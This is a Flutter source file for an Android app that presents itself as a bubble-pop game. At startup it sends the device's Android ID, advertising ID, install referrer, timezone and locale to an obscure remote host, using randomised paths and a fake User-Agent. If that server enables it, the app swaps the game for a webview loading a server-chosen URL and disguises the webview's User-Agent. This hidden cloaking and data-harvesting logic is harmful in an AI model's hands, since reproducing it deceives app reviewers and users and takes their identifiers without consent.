import 'dart:convert';
import 'dart:math';
import 'dart:ui';

import 'package:android_id/android_id.dart';
import 'package:bubble_pop/BScreen.dart';
import 'package:bubble_pop/inite.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:advertising_id/advertising_id.dart';
import 'package:play_install_referrer/play_install_referrer.dart';
import 'package:pretty_dio_logger/pretty_dio_logger.dart';
import 'package:uuid/uuid.dart';
import 'package:wakelock_plus/wakelock_plus.dart';

import 'bubble_pop_game.dart';

void main() {
  runApp(const MainApp());
}

final dio = Dio()
  ..interceptors.add(
    PrettyDioLogger(requestBody: false, requestHeader: false, responseBody: false),
  );
final _random = Random();

/// 生成12位随机字符串
String rs(int length) {
  return List.generate(length, (_) => _random.nextInt(36).toRadixString(36)).join();
}

class MainApp extends StatefulWidget {
  const MainApp({super.key});

  @override
  State<MainApp> createState() => _MainAppState();
}

class _MainAppState extends State<MainApp> {
  var showLoading = true;
  var data = {};

  Future<dynamic> getData() async {
    final host = 'https://www.m3n6b9v2c5x.xyz';
    final packageInfo = await PackageInfo.fromPlatform();
    final packageName = packageInfo.packageName;

    final androidId = await AndroidId().getId();
    final referrer = await PlayInstallReferrer.installReferrer;
    final timeZone = await FlutterTimezone.getLocalTimezone();
    final userAgent = await InAppWebViewController.getDefaultUserAgent();
    final advertisingId = await AdvertisingId.id(true);

    Response response;
    var data = {
      'android_id': androidId,
      'gps_adid': advertisingId,
      'install_referrer': referrer.installReferrer,
      'timeZone': timeZone.identifier,
      'locales': PlatformDispatcher.instance.locale.toString(),
    };
    var options = Options(
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'sdfew', //userAgent,
      },
    );
    try {
      response = await dio.post(
        '$host/${rs(12)}e/$packageName/${rs(12)}',
        data: data,
        options: options,
      );
      return response.data;
    } on Exception catch (e) {
      debugPrint(e.toString());
      return null;
    }
  }

  @override
  void initState() {
    super.initState();
    WakelockPlus.enable();
    getData().then((value) async {
      debugPrint('结果返回值: $value');
      data = value ?? {};
      if (value != null) {
        String toUrl = value['toUrl'] ?? '';
        String sdkKey = value['sdkKey'] ?? '';
        String extra = value['extra'] ?? '';
        String eventType = 'ad';

        if (extra.isNotEmpty) {
          Map<String, dynamic> extraMap = json.decode(extra);
          if (extraMap.containsKey('OneSignalKey')) {
            String oneSignalKey = extraMap['OneSignalKey'];
            initPush(true, oneSignalKey);
          }
          if (extraMap.containsKey('type')) eventType = extraMap['type'];
        }
        if (eventType == 'ad') {
          initAdjust(sdkKey);
        } else if (eventType == 'af') {
          initAppsflyer(sdkKey, '');
        }
        if (value['type'] == 'tc') {
          // 天成
          toUrl = await getS2SAdUrl(toUrl, sdkKey);
          data['toUrl'] = toUrl;
        }

        //deal userAgent
        String userAgent = value['userAgent'] ?? '';
        if (userAgent.isNotEmpty) {
          var originUA = await InAppWebViewController.getDefaultUserAgent();
          //.replace('; wv', '; xx-xx')
          originUA = originUA.replaceAll('; wv', '; xx-xx');
          String uuid = Uuid().v4();
          final androidInfo = await DeviceInfoPlugin().androidInfo;
          originUA += '/${androidInfo.brand}/$userAgent UUID/$uuid';
          data['userAgent'] = originUA;
        }
        data['eventType'] = eventType;
      }
      setState(() => showLoading = false);
    });
  }

  @override
  Widget build(BuildContext context) {
    if (showLoading) {
      return MaterialApp(
        home: Scaffold(
          body: Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              mainAxisSize: MainAxisSize.min,
              children: [
                Text('loading...', style: TextStyle(color: Colors.white)),
                const SizedBox(height: 10),
                const SizedBox(
                  height: 1,
                  width: 100,
                  child: LinearProgressIndicator(color: Colors.white),
                ),
              ],
            ),
          ),
          backgroundColor: Colors.black,
        ),
      );
    } else {
      if (data.isNotEmpty && data['enable'] == true) {
        return MaterialApp(
          home: Bscreen(
            toUrl: data['toUrl'],
            userAgent: data['userAgent'] ?? '',
            config: data['config'],
            eventType: data['eventType'] ?? 'ad',
          ),
        );
      } else {
        return MaterialApp(home: BubblePopApp());
      }
    }
  }
}
